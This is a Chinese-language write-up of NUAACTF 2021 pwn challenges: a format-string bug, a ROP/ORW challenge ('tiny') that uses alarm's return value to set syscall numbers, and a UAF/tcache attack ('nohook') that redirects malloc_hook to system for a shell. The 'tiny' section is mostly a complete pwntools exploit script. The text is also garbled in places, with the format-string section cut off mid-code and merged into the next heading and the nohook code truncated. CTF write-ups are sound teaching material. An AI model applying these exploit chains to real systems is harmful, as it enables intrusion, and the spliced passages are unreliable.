# 2021NUAACTF PWN&RE WP详解
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
这是2021年NUAACTF的pwn题目和部分re的详细分析，官方给的wp只有一句话，我对其进行详细的分析，记录如下，若有错误，请指正。
## PWN -> format (fmt)
###  题目分析
题目没有开pie，环境20.04，ida查看有一个格式化字符串漏洞：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int fd; // [rsp+4h] [rbp-1Ch]
      void *buf; // [rsp+8h] [rbp-18h]
      char format[8]; // [rsp+10h] [rbp-10h] BYREF
      unsigned __int64 v7; // [rsp+18h] [rbp-8h]
      v7 = __readfsqword(0x28u);
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      fd = open("./flag", 0);
      buf = malloc(0x30uLL);
      read(fd, buf, 0x30uLL);
      close(fd);
      read(0, format, 8uLL);
      printf(format);    tiny (alarm返回值、rop、orw)
###  题目分析
保护只开了NX保护，环境20.04，shellcode不能用，ida查看伪代码：
    __int64 start()
    {
      signed __int64 v0; // rax
      signed __int64 v1; // rax
      sys_alarm();
      v0 = sys_write(1u, s1, 0x24uLL);
      v1 = sys_write(1u, s2, 0x1CuLL);
      return v();
    }
程序没有多余的函数还有段，只有四个函数start、vul、alarm、libc_csu_init,程序先alarm然后输出提示信息，输入字符串，在vul函数中存在溢出：
    __int64 vul()
    {
      signed __int64 v0; // rax
      signed __int64 v1; // rax
      char buf[8]; // [rsp+8h] [rbp-8h] BYREF
      v0 = sys_read(0, buf, 0x70uLL);   
    .text:00000000004010B7                 leave
    .text:00000000004010B8                 retn
    .text:00000000004010B8 ; } // starts at 401070
    .text:00000000004010B8 vul             endp
所以通过read读入字节数控制rax行不通。思索还有啥能控制rax的呢？果然通过查alarm函数返回值知道，alarm函数返回值通俗的说是距alarm还剩的秒数，这里要控制rax
= 2调用open，就要在alarm剩余两秒的时候调用，函数返回2，同理在alarm剩余1秒的时候调用alarm，rax =
1调用write，实现读取flag。思路可以将栈迁移到bss段，然后在bss段进行orw。  
利用步骤：
  1. 通过栈溢出控制rbp为bss+0x30，返回地址为rop，调用sys_read，将./flag写入bss
  2. 通过alarm设置rax = 2，rop调用sys_open打开./flag文件
  3. rop调用sys_read，将fd（flag）读入bss-0x120处
  4. 通过alarm设置rax = 1，rop调用sys_write输出flag
###  exp
    from pwn import *
    context.log_level='debug'
    context.terminal = ['/bin/tmux', 'split', '-h']
    sh = process('./tiny')
    bss =  0x405000-0x100
    vul = 0x401070
    alarm = 0x401055
    syscall = 0x4010ad
    pop_rdi = 0x401103
    pop_rsi_r15 = 0x401101
    '''
    .text:0000000000401088                 mov     eax, 0
    .text:000000000040108D                 mov     edx, 70h ; 'p'  ; count
    .text:0000000000401092                 syscall                 ; LINUX - sys_read
    '''
    edi_0_edx_70_eax_0_syscall = 0x401083
    #gdb.attach(sh)
    #pause()
    sh.recvuntil('pwned!')
    payload = p64(0) + p64(bss+0x30)
    payload += p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(edi_0_edx_70_eax_0_syscall) #0x20  read(0,bss,0x70)
    sh.send(payload)
    sh.recvuntil('Bye')
    bp_payload = b'./flag\x00\x00' + b'\x00'*0x28 + p64(vul) + p64(vul) + p64(vul)
    sh.sendline(bp_payload)
    payload = p64(0) + p64(bss + 0x70)
    payload += p64(alarm) + p64(pop_rdi) + p64(bss) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(syscall) + p64(vul) #0x40  open(bss,0,0)
    sleep(10) # rax = 2 open
    sh.send(payload)
    sh.recvuntil('Bye')
    sh.recvuntil('Bye')
    payload = p64(0) + p64(bss+0xa8)
    payload += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(bss-0x120) + p64(0) + p64(0x401088) + p64(vul) #0x30 read(3,bss-0x120,0x70)
    sh.send(payload)
    sleep(11)   # rax = 1  write
    #gdb.attach(sh,'b *0x40106d')
    sh.recvuntil('Bye')
    payload = p64(0) + p64(bss)
    payload += p64(alarm) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(bss-0x120) + p64(0) + p64(0x40108d) # write(1,bss-0x120,0x70)
    sh.send(payload)
    sh.interactive()
###  总结
这个题第一次遇见，只有几个函数，程序编译的时候去掉了startfiles，程序用汇编编写，思路是栈溢出，通过alarm函数的返回值控制rax的值，从而进行orw来读取flag，第一次关注了alarm返回值的作用。
## PWN -> nohook (UAF、edit检测hook、花指令)
###  题目分析
保护全开，漏洞点如下：  
delete函数
    void delete()
    {
      int v0; // [rsp+Ch] [rbp-4h]
      puts("id:");
      v0 = itoll_read();
      if ( v0 system。实现了与edit直接修改mallochook为system相同的作用。  
 **利用步骤：**
  1. 申请largebin 然后free进入unsortedbin，泄露libc
  2. 构造tcache attack申请到mallochook
  3. 构造tcache attack使得tcache指向system
  4. free 步骤2中申请到的mallochook，使得mallochook -> system
  5. add(“/bin/sh”)触发mallochook，size为longlong类型，可以size=‘/bin/sh’
  6. get shell
###  总结
题目条件有很明显的为这种利用方式开路，首先delete的UAF，其次size是longlong类型，可以直接malloc(size)
->system(‘/bin/sh’)，题目隐藏了关键nohook的点（花指令），坑点之一就在这，做提前要看仔细了，之后就是巧妙地用free的顺序绕过了edit对malloc/free
hook的检测，其实就是将mallochook的fd指针指向system就能实现和直接用edit修改mallochook的效果，而tcache链表刚好是由fd来链接的，所以可以通过free顺序实现修改mallochook